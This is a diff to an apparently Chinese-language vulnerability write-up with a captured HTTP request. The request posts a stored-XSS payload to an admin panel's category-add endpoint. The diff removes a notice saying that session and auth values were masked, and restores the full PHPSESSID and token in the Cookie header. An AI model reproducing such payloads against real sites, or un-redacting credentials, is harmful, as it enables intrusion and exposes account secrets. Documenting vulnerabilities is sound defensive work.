@@ -20,7 +20,6 @@ schema_version: "1"
 
 ## 核对与使用边界
 
-- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
 
 本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
 
@@ -59,7 +58,7 @@ V1.0.0.20200506\_beta
     Origin: https://www.0-sec.org
     Connection: close
     Referer: http://admin.com/admin.php/category/add?dialog=1
-    Cookie: PHPSESSID=ou6********************ca4; uid=3; token=f82******************************226
+    Cookie: PHPSESSID=ou6fjfn717lu02rfm9saqguca4; uid=3; token=f824ac8c-ac7b-4979-a89b-b47dd8e79226
 
     row%5Btype%5D=default&row%5Bpid%5D=0&row%5Bname%5D=%3Cscript%3Ealert(1)%3C%2Fscript%3E&row%5Bnickname%5D=123&row%5Bimage%5D=1&row%5Bkeywords%5D=123&row%5Bdescription%5D=123&row%5Bweigh%5D=0&row%5Bstatus%5D=normal&row%5Bflag%5D%5B%5D=
 
